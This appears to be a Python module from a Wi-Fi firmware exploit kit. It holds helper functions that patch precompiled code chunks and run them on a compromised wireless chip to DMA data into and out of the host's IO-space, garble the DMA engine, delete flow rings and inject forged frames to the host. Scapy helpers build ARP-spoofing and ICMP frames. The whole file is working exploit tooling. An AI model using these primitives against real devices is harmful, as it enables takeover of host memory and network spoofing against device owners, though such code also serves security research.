from rrm_exploit.attack import *
from rrm_exploit.conf import *
from defs import *
from scapy.all import *
import struct

def double_dma(host_addr1, dma_contents1, host_addr2, dma_contents2, num_races=1):
    '''
    Performs two simultaneous DMAs into the two given addresses in IO-Space
    In addition to performing the DMAs, also garbles the DMA H2D engine's registers -
    this prevents the dongle from performing additional H2D DMAs that'll crash the SoC.
    '''

    code_chunk = open("code_chunks/double_dma/chunk.bin", "rb").read()
    code_chunk = code_chunk.replace(struct.pack("<I", 0xBEEF0101), struct.pack("<I", len(dma_contents1)))
    code_chunk = code_chunk.replace(struct.pack("<I", 0xBEEF0202), struct.pack("<I", len(dma_contents2)))
    code_chunk = code_chunk.replace(struct.pack("<I", 0xBEEF0303), struct.pack("<I", host_addr1))
    code_chunk = code_chunk.replace(struct.pack("<I", 0xBEEF0505), struct.pack("<I", host_addr2))
    code_chunk = code_chunk.replace(struct.pack("<I", 0xBEEF0404), struct.pack("<I", num_races))
    code_chunk = code_chunk.replace(16*"\xAB", dma_contents1 + ("\xAB" * (16 - len(dma_contents1))))
    code_chunk = code_chunk.replace(16*"\xCD", dma_contents2 + ("\xCD" * (16 - len(dma_contents2))))
    execute_chunk(code_chunk)

def dma_d2h(host_addr, dma_contents):
    '''
    DMA-ing into the given IO-Space address
    '''
    code_chunk = open("code_chunks/dma_d2h/chunk.bin", "rb").read()
    code_chunk = code_chunk.replace(struct.pack("<I", 0xBEEF0101), struct.pack("<I", len(dma_contents)))
    code_chunk = code_chunk.replace(struct.pack("<I", 0xBEEF0202), struct.pack("<I", host_addr))
    code_chunk = code_chunk.replace(128*"\xAB", dma_contents + ("\xAB" * (128 - len(dma_contents))))
    execute_chunk(code_chunk)

def dma_h2d(host_addr, dest_addr, length):
    '''
    Uses DMA to read the given IO-Space range into the firmware
    '''
    code_chunk = open("code_chunks/dma_h2d/chunk.bin", "rb").read()
    code_chunk = code_chunk.replace(struct.pack("<I", 0xBEEF0101), struct.pack("<I", length))
    code_chunk = code_chunk.replace(struct.pack("<I", 0xBEEF0202), struct.pack("<I", host_addr))
    code_chunk = code_chunk.replace(struct.pack("<I", 0xBEEF0303), struct.pack("<I", dest_addr))
    execute_chunk(code_chunk)

def read_iospace_dword(host_addr):
    '''
    Reads the given DWORD from the IO-Space by DMA-ing H2D
    '''
    write_dword_fast(FW_JUNK_ADDR, JUNK_VALUE)
    dma_h2d(host_addr, FW_JUNK_ADDR, DWORD_SIZE)
    while read_dword(FW_JUNK_ADDR) == JUNK_VALUE: pass
    return read_dword(FW_JUNK_ADDR)

def read_iospace_qword(host_addr):
    '''
    Reads the given QWORD from the IO-Space by DMA-ing H2D
    '''
    write_dword_fast(FW_JUNK_ADDR, JUNK_VALUE)
    dma_h2d(host_addr, FW_JUNK_ADDR, QWORD_SIZE)
    while read_dword(FW_JUNK_ADDR) == JUNK_VALUE: pass
    lo = read_dword(FW_JUNK_ADDR)
    hi = read_dword(FW_JUNK_ADDR + DWORD_SIZE)
    return struct.unpack("<Q", struct.pack("<II", lo, hi))[0]

def delete_ring(ring_id):
    '''
    Deletes the flow ring with the given ID 
    '''
    code_chunk = open("code_chunks/delete_flow_ring/chunk.bin", "rb").read()
    code_chunk = code_chunk.replace(struct.pack("<I", 0xBEEF0101), struct.pack("<I", ring_id))
    execute_chunk(code_chunk)

def inject_frame(frame, num_injections=1):
    '''
    Directly injects a frame from the firwmare to the host, without sending it OTA
    '''
    code_chunk = open("code_chunks/send_frame/chunk.bin", "rb").read()
    code_chunk = code_chunk.replace(struct.pack("<I", 0xF12A515E), struct.pack("<I", len(frame)))
    code_chunk = code_chunk.replace(struct.pack("<I", 0xBEEFBEEF), struct.pack("<I", num_injections))
    code_chunk = code_chunk.replace(256*"\xAB", frame + ("\xAB" * (256 - len(frame))))
    execute_chunk(code_chunk)

def build_icmp_echo_req(srcmac, dstmac, srcip, dstip):
    '''
    Builds an ICMP Echo request with the given source and destination addresses
    '''
    return str(Ether(src=srcmac, dst=dstmac, type=0x800)/IP(src=srcip, dst=dstip)/ICMP(type=8, code=0)/"ECHO REQUEST")

def build_arp_response(apmac, srcmac, dstmac, srcip, dstip):
    '''
    Builds an ARP response with the given source and destination addresses
    '''
    return str(Ether(src=apmac, dst=dstmac, type=0x806)/ARP(op=2, pdst=dstip, psrc=srcip, hwdst=dstmac, hwsrc=srcmac))

def ping(srcmac, dstmac, srcip, dstip, spoof_arp, count=1):
    '''
    Sends an ICMP echo request from the given address to the target address.
    '''
  
    #Do we need to spoof an ARP response before sending the request?
    if spoof_arp:
    
        #Trigger an ARP request by sending a ping from an unknown IP
        ping = build_icmp_echo_req(AP_MAC, dstmac, srcip, dstip)
        inject_frame(ping)
        sniff(filter="arp and ether src %s and ether dst %s" % (dstmac, "FF:FF:FF:FF:FF:FF"), iface=INTERFACE, count=1, timeout=3)

        #Answer the ARP request, pointing the spoofed IP at our spoofed MAC
        arp_resp = build_arp_response(AP_MAC, srcmac, dstmac, srcip, dstip)
        inject_frame(arp_resp)

    #Send an additional ping, but now from the spoofed MAC (since we're in the ARP cache)
    ping = build_icmp_echo_req(AP_MAC, dstmac, srcip, dstip)
    inject_frame(ping, count)

